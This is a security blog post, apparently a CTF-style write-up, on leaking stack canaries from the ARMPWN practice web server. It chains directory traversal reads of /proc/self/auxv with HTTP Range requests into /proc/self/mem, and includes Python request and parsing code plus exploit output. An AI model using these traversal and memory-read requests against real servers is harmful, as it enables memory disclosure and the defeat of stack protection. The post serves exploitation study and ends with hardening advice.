@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+
+
+  <title>ARMPWN redux: canary reloaded</title>
+
+  
+
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="referrer" content="origin" />
+  <meta name="generator" content="Pelican" />
+<link href="https://blahcat.github.io/posts/2017/01/24/armpwn-redux-canary-reloaded.html" rel="canonical" />
+  <!-- Feed -->
+        <link href="https://blahcat.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="BlahCats Full Atom Feed" />
+          <link href="https://blahcat.github.io/feeds/{slug}.atom.xml" type="application/atom+xml" rel="alternate" title="BlahCats Categories Atom Feed" />
+
+  <link href="https://blahcat.github.io/theme/css/style.css" type="text/css" rel="stylesheet" />
+
+  <!-- Code highlight color scheme -->
+      <link href="https://blahcat.github.io/theme/css/code_blocks/github.css" rel="stylesheet">
+
+    <!-- CSS specified by the user -->
+
+
+    <link href="https://fonts.googleapis.com/css?family=Roboto" type="text/css" rel="stylesheet" />
+
+
+    <link href="https://blahcat.github.io/assets/css/overrides.css" type="text/css" rel="stylesheet" />
+
+
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" type="text/css" rel="stylesheet" />
+
+  <!-- Custom fonts -->
+  <link href='https://fonts.googleapis.com/css?family=Montserrat:400,300' rel='stylesheet' type='text/css' />
+  <link href="https://fonts.googleapis.com/css?family=Lato" rel="stylesheet" type="text/css" />
+
+
+  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+  <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+  <![endif]-->
+
+
+
+    <meta name="description" content="TL;DR: It is possible to defeat stack canary protection when a binary is vulnerable to arbitrary file read. Intro First of, Happy New...">
+
+    <meta name="author" content="hugsy">
+
+    <meta name="tags" content="linux">
+    <meta name="tags" content="pwn">
+    <meta name="tags" content="arm">
+    <meta name="tags" content="ssp">
+    <meta name="tags" content="armpwn">
+
+
+
+
+<!-- Open Graph -->
+<meta prefix="og: http://ogp.me/ns#" property="og:site_name" content="BlahCats"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:title" content="ARMPWN redux: canary reloaded"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:description" content="TL;DR: It is possible to defeat stack canary protection when a binary is vulnerable to arbitrary file read. Intro First of, Happy New..."/>
+<meta prefix="og: http://ogp.me/ns#" property="og:locale" content="en_US"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:url" content="https://blahcat.github.io/posts/2017/01/24/armpwn-redux-canary-reloaded.html"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:type" content="article"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:published_time" content="2017-01-24 00:00:00-08:00"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:modified_time" content="2017-01-24 00:00:00-08:00"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:author" content="https://blahcat.github.io/author/hugsy">
+<meta prefix="og: http://ogp.me/ns#" property="article:section" content="ctf"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="linux"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="pwn"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="arm"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="ssp"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="armpwn"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:image" content="https://blahcat.github.io/assets/images/blog-cover.png">
+
+<!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@ctf_blahcat">
+    <meta name="twitter:title" content="ARMPWN redux: canary reloaded">
+    <meta name="twitter:url" content="https://blahcat.github.io/posts/2017/01/24/armpwn-redux-canary-reloaded.html">
+
+        <meta name="twitter:image:src" content="https://blahcat.github.io/assets/images/blog-cover.png">
+
+      <meta name="twitter:description" content="TL;DR: It is possible to defeat stack canary protection when a binary is vulnerable to arbitrary file read. Intro First of, Happy New...">
+
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "name": "ARMPWN redux: canary reloaded",
+  "headline": "ARMPWN redux: canary reloaded",
+  "datePublished": "2017-01-24 00:00:00-08:00",
+  "dateModified": "2017-01-24 00:00:00-08:00",
+  "author": {
+    "@type": "Person",
+    "name": "hugsy",
+    "url": "https://blahcat.github.io/author/hugsy"
+  },
+  "image": "https://blahcat.github.io/assets/images/blog-cover.png",
+  "url": "https://blahcat.github.io/posts/2017/01/24/armpwn-redux-canary-reloaded.html",
+  "description": "TL;DR: It is possible to defeat stack canary protection when a binary is vulnerable to arbitrary file read. Intro First of, Happy New..."
+}
+</script>
+</head>
+<!-- TODO : Body class -->
+<body class="home-template">
+
+<nav id="menu">
+  <a class="close-button">Close</a>
+  <div class="nav-wrapper">
+    <p class="nav-label">Menu</p>
+    <ul>
+          <li><a href="/pages/about.html" role="presentation">About</a></li>
+          <li><a href="/categories/" role="presentation">Browse By Category</a></li>
+          <li><a href="/tags/" role="presentation">Browse By Tag</a></li>
+          <li><a href="/pages/qemu-vm-repo" role="presentation">Qemu VMs</a></li>
+          <li><a href="/pages/exploitation-series" role="presentation">Exploitation Tutorials</a></li>
+          <li><a href="/pages/notes" role="presentation">Misc Notes</a></li>
+          <li><a href="/feeds/all.atom.xml" role="presentation">RSS Feed</a></li>
+
+
+    </ul>
+  </div>
+</nav>
+    <!-- Progressbar -->
+    <div class="progress-container">
+        <span class="progress-bar"></span>
+    </div>
+
+    <!-- Page Header -->
+    <!-- Set your background image for this header on the line below. -->
+    <header id="post-header" class="has-cover">
+      <div class="inner">
+        <nav id="navigation">
+            <span id="home-button" class="nav-button">
+                <a class="home-button" href="https://blahcat.github.io/" title="Home"><i class="ic ic-arrow-left"></i> Home</a>
+            </span>
+          <span id="menu-button" class="nav-button">
+            <a class="menu-button"><i class="ic ic-menu"></i> Menu</a>
+          </span>
+        </nav>
+        <h1 class="post-title">ARMPWN redux: canary reloaded</h1>
+        <!-- TODO : Proper class for headline -->
+        <span class="post-meta">
+                <a href="https://blahcat.github.io/author/hugsy">hugsy</a>
+            <br>
+              Posted on <time style="font-weight: bold">24 Jan 2017</time>
+          </span>
+
+            <div class="post-cover cover" style="background-image: url('https://blahcat.github.io/assets/images/blog-cover.png')">
+      </div>
+    </header>
+
+  <section id="wrapper">
+    <a class="hidden-close"></a>
+
+    <!-- Post content -->
+    <main class="content" role="main">
+        <article class="post">
+        <div class="inner">
+            <section class="post-content">
+                <blockquote>
+<p><strong>TL;DR</strong>: It is possible to defeat stack canary protection when a binary is vulnerable to
+arbitrary file read.
+</p>
+</blockquote>
+<h2>Intro</h2>
+<p>First of, Happy New Year 2017 ✌</p>
+<p>Recently, I've decided to thoroughly investigate the "<em>Stack Smashing
+Protection</em>" (SSP) on recent Linux and recent Glibc. This research has led to a
+blog post available on <a href="https://www.elttam.com.au/blog">elttam R&amp;D blog</a>. Among
+many other things, I've found that canaries built with recent glibc may have
+their values leaked, should the program be also vulnerable to an arbitrary file
+read access, and if it exposes its
+<a href="https://www.elttam.com.au/blog/playing-with-canaries#auxiliary-vector">Auxiliary Vector</a> via
+the <code>procfs</code> structure.</p>
+<p>All the details regarding the following attack on the canary are explained in
+this blog post, so I will assume that you are familiar with it. If you're not:</p>
+<ul>
+<li>the full article is <a href="https://www.elttam.com.au/blog/playing-with-canaries" target="_blank">here</a></li>
+<li>the code repository is <a href="https://github.com/elttam/canary-fun" target="_blank">there</a></li>
+</ul>
+<p>In the article, I imagined the attack scenario would apply perfectly well to a
+Web or FTP server, and would occur following those steps:</p>
+<ol>
+<li>dump <code>/proc/self/auxv</code> to get the <code>AT_RANDOM</code> location</li>
+<li>read <code>/proc/self/mem</code> and force an <code>lseek</code> access to reach the location found
+     above via
+     the <a href="https://tools.ietf.org/html/rfc7233#page-8" target="_blank">HTTP header Range</a> (for
+     instance <code>Range: bytes=&lt;0xAT_RANDOM_LOCATION&gt;-&lt;0xAT_RANDOM_LOCATION+16&gt;</code>)</li>
+<li>Truncate the received buffer to <code>sizeof(register)</code></li>
+<li>Nullify the last byte (<code>result &amp;= ~0xff</code>)</li>
+</ol>
+<p>That was the theory, which made perfect sense, but I wanted a practice
+case.</p>
+<p>Earlier this year, I <a href="/posts/2016/06/13/armpwn-challenge-write-up.html" target="_blank">had some fun with ARMPWN</a>, a vulnerable web server
+created by  <a class="fa fa-twitter" href="https://twitter.com/5aelo" target="_blank"> @5aelo</a> to practice
+exploitation on ARM, so I have decided to use it for a practical, yet very
+realistic exploit case.</p>
+<p>You can download:</p>
+<ul>
+<li><a href="https://gist.github.com/00d74ecac86297efc6772e415f307176" target="_blank">the new websrv.c here</a></li>
+<li><a href="https://gist.github.com/c2dbc3e3c11836dcebf53a2189f35976" target="_blank">or simply the patch here</a></li>
+</ul>
+<h2>Patch analysis</h2>
+<p>This cheap patch provides to the "new" <code>websrv</code> the (pseudo-)capability to
+<a href="https://gist.github.com/hugsy/00d74ecac86297efc6772e415f307176#file-websrv-c-L181-L201" target="_blank">parse the HTTP Range header</a>
+provided by the client. This is basically how modern Web servers (Apache, nginx)
+treat this header.</p>
+<div class="highlight"><pre><span></span><code><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">start</span><span class="p">,</span><span class="w"> </span><span class="n">end</span><span class="p">;</span>
+<span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">ptr</span><span class="p">;</span>
+<span class="kt">int</span><span class="w"> </span><span class="n">r</span><span class="p">;</span>
+
+<span class="n">start</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">end</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get_range_header</span><span class="p">(</span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">len</span><span class="p">);</span>
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">ptr</span><span class="p">){</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">get_ranges_from_header</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">start</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">end</span><span class="p">)</span><span class="o">==</span><span class="mi">0</span><span class="p">){</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">start</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">end</span><span class="p">){</span>
+<span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s:%d reading range of file &#39;%s&#39; from %u-%u</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">inet_ntoa</span><span class="p">(</span><span class="n">client</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">),</span><span class="w"> </span><span class="n">htons</span><span class="p">(</span><span class="n">client</span><span class="p">.</span><span class="n">sin_port</span><span class="p">),</span><span class="w"> </span><span class="n">file</span><span class="p">,</span><span class="w"> </span><span class="n">start</span><span class="p">,</span><span class="w"> </span><span class="n">end</span><span class="p">);</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">lseek</span><span class="p">(</span><span class="n">fileno</span><span class="p">(</span><span class="n">f</span><span class="p">),</span><span class="w"> </span><span class="n">start</span><span class="p">,</span><span class="w"> </span><span class="n">SEEK_SET</span><span class="p">)</span><span class="o">==</span><span class="mi">-1</span><span class="p">){</span>
+<span class="w">                </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;lseek() failed:&quot;</span><span class="p">);</span>
+<span class="p">[...]</span>
+</code></pre></div>
+
+<p>In the earlier exploit, we had exploited the Directory Traversal to dump the
+process memory mapping (via <code>/proc/self/maps</code>) and defeat PIE &amp; ASLR. To crush
+SSP protection, we managed to get the canary value by brute-forcing it, which is
+very noisy (the canary can be found in max. of 4*256=1024 HTTP requests on a
+32-bit architecture, 2048 on 64-bit) and risky (the memory corruption may alert
+of an on-going attack).</p>
+<p>But now we can actually do much better: we have all the conditions
+mentioned earlier to exfiltrate the canary's value, thanks to the ELF Auxiliary
+Vector.</p>
+<h2>Exploitation</h2>
+<p>This approach is a lot more stable and stealthier than canary brute-forcing,
+since we don't rely on any memory corruption/process crash to determine the
+valid bytes of the canary
+<a href="/2016/06/12/armpwn-challenge#leaking-the-canary" target="_blank">as we did before</a>.</p>
+<h3>Find AT_RANDOM from the Auxiliary Vector</h3>
+<p>So first, we need to read the process <em>Auxiliary Vector</em> exposed via <code>procfs</code>.</p>
+<div class="highlight"><pre><span></span><code><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;GET ../../../../../proc/self/auxv HTTP/1.0</span><span class="se">\r\n\r\n</span><span class="s2">&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<p>And then parse the result:</p>
+<div class="highlight"><pre><span></span><code><span class="n">AT_RANDOM</span> <span class="o">=</span> <span class="mi">25</span>
+<span class="p">[</span><span class="o">...</span><span class="p">]</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="mi">8</span><span class="p">):</span>
+    <span class="n">code</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;&lt;I&quot;</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="k">if</span> <span class="n">code</span><span class="o">==</span><span class="n">AT_RANDOM</span><span class="p">:</span>
+        <span class="n">at_random_address</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;&lt;I&quot;</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">4</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="k">break</span>
+</code></pre></div>
+
+<p>If we did things correctly, this will store in the variable <code>at_random_address</code>
+the address of the 16 random bytes provided by the kernel, used to create the
+canary.</p>
+<h3>(l)seeking the process memory via the HTTP Range header</h3>
+<p>Since <code>procfs</code> also exposes the process memory, we can use <code>/proc/&lt;pid&gt;/mem</code> to
+seek to the address we've found at the step above.</p>
+<div class="highlight"><pre><span></span><code><span class="n">m</span> <span class="o">=</span> <span class="s2">&quot;GET ../../../../../proc/self/mem HTTP/1.0</span><span class="se">\r\n</span><span class="s2">&quot;</span>
+<span class="n">m</span><span class="o">+=</span> <span class="s2">&quot;Range: bytes=</span><span class="si">{:d}</span><span class="s2">-</span><span class="si">{:d}</span><span class="se">\r\n\r\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">at_random_address</span><span class="p">,</span><span class="n">at_random_address</span><span class="o">+</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
+</code></pre></div>
+
+<div class="alert-warning"><i class="fa fa-info-circle">&nbsp;Warning:</i> <code>yama/ptrace_scope</code> must be set to 0 to be able to read the process</div>
+<p>memory.</p>
+<h3>Fire!</h3>
+<p>The final exploitation script which combines all the steps described above can
+be found <a href="https://gist.github.com/hugsy/a462b398721bfb7e6bbd678b6d0e852b">here</a>.</p>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>python<span class="w"> </span>armpwn_leak_canary.py
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Connected<span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;rpi2-1:80&#39;</span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Leaking<span class="w"> </span>AUVX
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span><span class="nv">AT_RANDOM</span><span class="o">=</span>0xbe8409c5
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Forging<span class="w"> </span>HTTP<span class="w"> </span>request<span class="w"> </span>using<span class="w"> </span>Range
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Canary<span class="w"> </span>is<span class="w"> </span>0xd998d300
+</code></pre></div>
+
+<p>To be we fetched the correct value for the canary of the remote process, we can use <a href="https://github.com/elttam/canary-fun/blob/master/read_canary_from_pid.py">this script</a> locally to compare the values for the canary:</p>
+<p><img alt="image_alt" src="https://i.imgur.com/IWpuMIy.png"></p>
+<h2>Conclusion</h2>
+<p>This exploitation shows a different way to leak the canary value, and therefore defeat the SSP protection. As you may have noticed, since this attack does not rely on memory corruption, it is extremely reliable. And it is also much faster: the canary brute-force can take up 4x256 (or resp. 8x256 for 64-bits) requests to determine, where this approach found the same value with only 2 requests.</p>
+<p>This illustrates once again the need to maintain a system as hardened as possible, especially on production systems, since restricting <code>ptrace</code>, or refusing to expose AUXV like GrSec does, would defeat this attack.</p>
+<p>Thanks for reading, and as usual drop me a line on IRC/Twitter/email for any question/comment ☕</p>
+            </section>
+
+
+            <section class="post-info">
+                <div class="post-share">
+                    <a class="twitter" href="https://twitter.com/share?text=ARMPWN redux: canary reloaded&amp;url=https://blahcat.github.io/posts/2017/01/24/armpwn-redux-canary-reloaded.html" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                    <i class="ic ic-twitter"></i><span class="hidden">Twitter</span>
+                    </a>
+                    <a class="facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://blahcat.github.io/posts/2017/01/24/armpwn-redux-canary-reloaded.html" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+                    <i class="ic ic-facebook"></i><span class="hidden">Facebook</span>
+                    </a>
+                    <a class="googleplus" href="https://plus.google.com/share?url=https://blahcat.github.io/posts/2017/01/24/armpwn-redux-canary-reloaded.html" onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+                    <i class="ic ic-googleplus"></i><span class="hidden">Google+</span>
+                    </a>
+                    <div class="clear"></div>
+                </div>
+
+                
+              
+                <aside class="post-tags">
+<a href="https://blahcat.github.io/tag/linux">linux</a><a href="https://blahcat.github.io/tag/pwn">pwn</a><a href="https://blahcat.github.io/tag/arm">arm</a><a href="https://blahcat.github.io/tag/ssp">ssp</a><a href="https://blahcat.github.io/tag/armpwn">armpwn</a>                </aside>
+              
+               <a title="Category" style="font-weight: bold;" class="category_link" href="https://blahcat.github.io/category/ctf">ctf</a>
+
+                <div class="clear"></div>
+
+                <aside class="post-discussions">
+                    <div id="discussion_thread">
+                      Continue the discussion on
+                      <a href="https://github.com/blahcat/blahcat.github.io/discussions?discussions_q=ARMPWN redux: canary reloaded">
+                        <i class="fa fa-github fa-lg"></i>
+                        GitHub
+                      </a>
+                      <div class="clear"></div>
+                    </div>
+                  </aside>
+
+
+                <aside class="post-author">
+
+
+                        <figure class="post-author-avatar">
+                            <img src="https://blahcat.github.io/assets/images/authors/hugsy.png" alt="hugsy" />
+                        </figure>
+                    <div class="post-author-bio">
+                        <h4 class="post-author-name"><a href="https://blahcat.github.io/author/hugsy">hugsy</a></h4>
+                            <p class="post-author-about">BWAAAAHHHH</p>
+                            <span class="post-author-website"><a href="/author/hugsy"><i class="ic ic-link"></i> Website</a></span>
+                        <!-- Social linkes in alphabet order. -->
+                            <span class="post-author-github"><a target="_blank" href="https://github.com/hugsy"><i class="ic ic-link"></i> GitHub</a></span>
+                            <span class="post-author-twitter"><a target="_blank" href="https://twitter.com/_hugsy_"><i class="ic ic-twitter"></i> Twitter</a></span>
+                    </div>
+                    <div class="clear"></div>
+                </aside>
+
+                </section>
+
+                <aside class="post-nav">
+                    <a class="post-nav-next" href="https://blahcat.github.io/posts/2017/01/26/insomnihack-ctf-2017-bender_safer.html">
+                        <section class="post-nav-teaser">
+                            <i class="ic ic-arrow-left"></i>
+                                <h2 class="post-nav-title">Insomni'Hack CTF 2017: bender_safer</h2>
+                            <p class="post-nav-excerpt">Insomni'Hack CTF 2017 offered a series of 3 challenges (i.e. 3 different flags) on the...</p>
+                        </section>
+                    </a>
+                    <a class="post-nav-prev" href="https://blahcat.github.io/posts/2016/09/06/twctf-2016-reverse_box-writeup.html">
+                        <section class="post-nav-teaser">
+                            <i class="ic ic-arrow-right"></i>
+                                <h2 class="post-nav-title">TWCTF 2016 - reverse_box writeup</h2>
+                            <p class="post-nav-excerpt">The reverse_box challenge of TWCTF 2016 was a warmup challenge (only 50 points), not...</p>
+                        </section>
+                    </a>
+                    <div class="clear"></div>
+                </aside>
+
+            </div>
+        </article>
+    </main>
+      <!-- TODO : Body class -->
+    <div id="body-class" style="display: none;" class=""></div>
+
+    <footer id="footer">
+      <div class="inner">
+        <section class="credits">
+          <span class="credits-theme"><a class="fa fa-twitter fa-3x" href="https://twitter.com/ctf_blahcat" target="_blank"></a>&nbsp;&nbsp;<a class="fa fa-github fa-3x" href="https://github.com/blahcat" target="_blank"></a>&nbsp;&nbsp;<a class="fa fa-youtube fa-3x" href="https://www.youtube.com/channel/UCDrgY65mRZWVoMiB5-VMqfg" target="_blank"></a></span>
+          <span class="credits-software">Powered by <a href="https://github.com/getpelican/pelican" rel="nofollow">Pelican</a> and <a href="https://github.com/arulrajnet/attila" rel="nofollow">Attila</a> theme</span>
+        </section>
+      </div>
+    </footer>
+  </section>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+  <script type="text/javascript" src="https://blahcat.github.io/theme/js/script.js"></script>
+
+    <!-- Script specified by the user -->
+    <script type="text/javascript"  src="https://cdnjs.cloudflare.com/ajax/libs/mermaid/9.1.1/mermaid.min.js"></script>
+</body>
+</html>
